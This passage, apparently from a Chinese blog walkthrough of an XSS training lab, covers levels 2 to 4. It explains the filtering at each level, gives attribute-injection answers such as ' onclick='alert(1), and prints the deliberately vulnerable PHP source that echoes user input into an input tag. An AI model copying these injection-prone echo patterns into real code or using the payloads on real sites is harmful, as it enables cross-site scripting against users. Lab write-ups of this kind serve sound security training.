class&#x3D;&quot;line&quot;&gt;11&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;12&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;13&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;14&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;15&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;16&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;17&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;18&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;19&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;20&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;21&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;22&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;23&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;24&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;25&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;26&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;27&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;28&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;29&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;30&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;td class&#x3D;&quot;code&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;&lt;!DOCTYPE &lt;span class&#x3D;&quot;keyword&quot;&gt;html&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;span class&#x3D;&quot;comment&quot;&gt;&lt;!--STATUS OK--&gt;&lt;&#x2F;span&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&lt;span class&#x3D;&quot;name&quot;&gt;html&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&lt;span class&#x3D;&quot;name&quot;&gt;head&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&lt;span class&#x3D;&quot;name&quot;&gt;meta&lt;&#x2F;span&gt; &lt;span class&#x3D;&quot;attr&quot;&gt;http-equiv&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;string&quot;&gt;&quot;content-type&quot;&lt;&#x2F;span&gt; &lt;span class&#x3D;&quot;attr&quot;&gt;content&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;string&quot;&gt;&quot;text&#x2F;html;charset&#x3D;utf-8&quot;&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&lt;span class&#x3D;&quot;name&quot;&gt;script&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;span class&#x3D;&quot;language-javascript&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;language-javascript&quot;&gt;&lt;span class&#x3D;&quot;variable language_&quot;&gt;window&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;property&quot;&gt;alert&lt;&#x2F;span&gt; &#x3D; &lt;span class&#x3D;&quot;keyword&quot;&gt;function&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;params&quot;&gt;&lt;&#x2F;span&gt;)  &lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;language-javascript&quot;&gt;&#123;     &lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;language-javascript&quot;&gt;&lt;span class&#x3D;&quot;title function_&quot;&gt;confirm&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;string&quot;&gt;&quot;完成的不错！&quot;&lt;&#x2F;span&gt;);&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;language-javascript&quot;&gt; &lt;span class&#x3D;&quot;variable language_&quot;&gt;window&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;property&quot;&gt;location&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;property&quot;&gt;href&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;string&quot;&gt;&quot;level3.php?writing&#x3D;wait&quot;&lt;&#x2F;span&gt;; &lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;language-javascript&quot;&gt;&#125;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;language-javascript&quot;&gt;&lt;&#x2F;span&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&#x2F;&lt;span class&#x3D;&quot;name&quot;&gt;script&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&lt;span class&#x3D;&quot;name&quot;&gt;title&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;欢迎来到level2&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&#x2F;&lt;span class&#x3D;&quot;name&quot;&gt;title&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&#x2F;&lt;span class&#x3D;&quot;name&quot;&gt;head&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&lt;span class&#x3D;&quot;name&quot;&gt;body&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&lt;span class&#x3D;&quot;name&quot;&gt;h1&lt;&#x2F;span&gt; &lt;span class&#x3D;&quot;attr&quot;&gt;align&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;string&quot;&gt;center&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;欢迎来到level2&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&#x2F;&lt;span class&#x3D;&quot;name&quot;&gt;h1&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;&lt;?php &lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;ini_set(&quot;display_errors&quot;, 0);&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;$str &#x3D; $_GET[&quot;keyword&quot;];&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;echo &quot;&lt;h2 align&#x3D;center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;&#x2F;h2&gt;&quot;.&#x27;&lt;center&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;&lt;form action&#x3D;level2.php method&#x3D;GET&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;&lt;input name&#x3D;keyword  value&#x3D;&quot;&#x27;.$str.&#x27;&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;&lt;input type&#x3D;submit name&#x3D;submit value&#x3D;&quot;搜索&quot;&#x2F;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;&lt;&#x2F;form&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;&lt;&#x2F;center&gt;&#x27;;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;?&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&lt;span class&#x3D;&quot;name&quot;&gt;center&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&lt;span class&#x3D;&quot;name&quot;&gt;img&lt;&#x2F;span&gt; &lt;span class&#x3D;&quot;attr&quot;&gt;src&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;string&quot;&gt;level2.png&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&#x2F;&lt;span class&#x3D;&quot;name&quot;&gt;center&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;&lt;?php &lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;echo &quot;&lt;h3 align&#x3D;center&gt;payload的长度:&quot;.strlen($str).&quot;&lt;&#x2F;h3&gt;&quot;;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;?&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&#x2F;&lt;span class&#x3D;&quot;name&quot;&gt;body&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&#x2F;&lt;span class&#x3D;&quot;name&quot;&gt;html&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;&lt;&#x2F;table&gt;&lt;&#x2F;figure&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Level 3&lt;&#x2F;p&gt;
&lt;p&gt;如下图所示，本题过滤了&lt;&gt;和&quot;，经过测试发现 ’ 未被过滤，则可以在input标签内内联JavaScript代码&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href&#x3D;&quot;https:&#x2F;&#x2F;c3ngh-blog.oss-cn-hangzhou.aliyuncs.com&#x2F;img&#x2F;image-20240202144949589.png&quot;&gt;&lt;img src&#x3D;&quot;https:&#x2F;&#x2F;c3ngh-blog.oss-cn-hangzhou.aliyuncs.com&#x2F;img&#x2F;image-20240202144949589.png&quot; alt&#x3D;&quot;img&quot;&gt;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;答案：&lt;code&gt;&#39; onclick&#x3D;&#39;alert(1)&lt;&#x2F;code&gt;&lt;&#x2F;strong&gt;，然后使用鼠标单击该输入框即可&lt;&#x2F;p&gt;
&lt;p&gt;源代码：&lt;&#x2F;p&gt;
&lt;figure class&#x3D;&quot;highlight html&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class&#x3D;&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;1&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;2&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;3&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;4&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;5&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;6&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;7&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;8&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;9&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;10&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;11&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;12&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;13&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;14&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;15&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;16&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;17&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;18&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;19&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;20&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;21&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;22&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;23&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;24&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;25&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;26&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;27&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;28&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;29&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;30&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;td class&#x3D;&quot;code&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;&lt;!DOCTYPE &lt;span class&#x3D;&quot;keyword&quot;&gt;html&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;span class&#x3D;&quot;comment&quot;&gt;&lt;!--STATUS OK--&gt;&lt;&#x2F;span&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&lt;span class&#x3D;&quot;name&quot;&gt;html&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&lt;span class&#x3D;&quot;name&quot;&gt;head&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&lt;span class&#x3D;&quot;name&quot;&gt;meta&lt;&#x2F;span&gt; &lt;span class&#x3D;&quot;attr&quot;&gt;http-equiv&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;string&quot;&gt;&quot;content-type&quot;&lt;&#x2F;span&gt; &lt;span class&#x3D;&quot;attr&quot;&gt;content&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;string&quot;&gt;&quot;text&#x2F;html;charset&#x3D;utf-8&quot;&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&lt;span class&#x3D;&quot;name&quot;&gt;script&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;span class&#x3D;&quot;language-javascript&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;language-javascript&quot;&gt;&lt;span class&#x3D;&quot;variable language_&quot;&gt;window&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;property&quot;&gt;alert&lt;&#x2F;span&gt; &#x3D; &lt;span class&#x3D;&quot;keyword&quot;&gt;function&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;params&quot;&gt;&lt;&#x2F;span&gt;)  &lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;language-javascript&quot;&gt;&#123;     &lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;language-javascript&quot;&gt;&lt;span class&#x3D;&quot;title function_&quot;&gt;confirm&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;string&quot;&gt;&quot;完成的不错！&quot;&lt;&#x2F;span&gt;);&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;language-javascript&quot;&gt; &lt;span class&#x3D;&quot;variable language_&quot;&gt;window&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;property&quot;&gt;location&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;property&quot;&gt;href&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;string&quot;&gt;&quot;level4.php?keyword&#x3D;try harder!&quot;&lt;&#x2F;span&gt;; &lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;language-javascript&quot;&gt;&#125;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;language-javascript&quot;&gt;&lt;&#x2F;span&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&#x2F;&lt;span class&#x3D;&quot;name&quot;&gt;script&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&lt;span class&#x3D;&quot;name&quot;&gt;title&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;欢迎来到level3&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&#x2F;&lt;span class&#x3D;&quot;name&quot;&gt;title&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&#x2F;&lt;span class&#x3D;&quot;name&quot;&gt;head&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&lt;span class&#x3D;&quot;name&quot;&gt;body&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&lt;span class&#x3D;&quot;name&quot;&gt;h1&lt;&#x2F;span&gt; &lt;span class&#x3D;&quot;attr&quot;&gt;align&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;string&quot;&gt;center&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;欢迎来到level3&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&#x2F;&lt;span class&#x3D;&quot;name&quot;&gt;h1&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;&lt;?php &lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;ini_set(&quot;display_errors&quot;, 0);&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;$str &#x3D; $_GET[&quot;keyword&quot;];&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;echo &quot;&lt;h2 align&#x3D;center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;&#x2F;h2&gt;&quot;.&quot;&lt;center&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;&lt;form action&#x3D;level3.php method&#x3D;GET&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;&lt;input name&#x3D;keyword  value&#x3D;&#x27;&quot;.htmlspecialchars($str).&quot;&#x27;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;&lt;input type&#x3D;submit name&#x3D;submit value&#x3D;搜索 &#x2F;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;&lt;&#x2F;form&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;&lt;&#x2F;center&gt;&quot;;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;?&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&lt;span class&#x3D;&quot;name&quot;&gt;center&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&lt;span class&#x3D;&quot;name&quot;&gt;img&lt;&#x2F;span&gt; &lt;span class&#x3D;&quot;attr&quot;&gt;src&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;string&quot;&gt;level3.png&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&#x2F;&lt;span class&#x3D;&quot;name&quot;&gt;center&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;&lt;?php &lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;echo &quot;&lt;h3 align&#x3D;center&gt;payload的长度:&quot;.strlen($str).&quot;&lt;&#x2F;h3&gt;&quot;;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;?&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&#x2F;&lt;span class&#x3D;&quot;name&quot;&gt;body&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&#x2F;&lt;span class&#x3D;&quot;name&quot;&gt;html&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;&lt;&#x2F;table&gt;&lt;&#x2F;figure&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Level 4&lt;&#x2F;p&gt;
&lt;p&gt;与Level 3相同，注意使用的是双引号即可&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href&#x3D;&quot;https:&#x2F;&#x2F;c3ngh-blog.oss-cn-hangzhou.aliyuncs.com&#x2F;img&#x2F;image-20240202145526384.png&quot;&gt;&lt;img src&#x3D;&quot;https:&#x2F;&#x2F;c3ngh-blog.oss-cn-hangzhou.aliyuncs.com&#x2F;img&#x2F;image-20240202145526384.png&quot; alt&#x3D;&quot;image-20240202145526384&quot;&gt;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;答案：&lt;code&gt;&quot; onclick&#x3D;&quot;alert(1)&lt;&#x2F;code&gt;&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;源代码：&lt;&#x2F;p&gt;
&lt;figure class&#x3D;&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class&#x3D;&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;1&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;2&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;3&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;4&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;5&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;6&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;7&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;8&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;9&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;10&lt;&#x2F;span&gt;&lt;br&gt;&lt;span 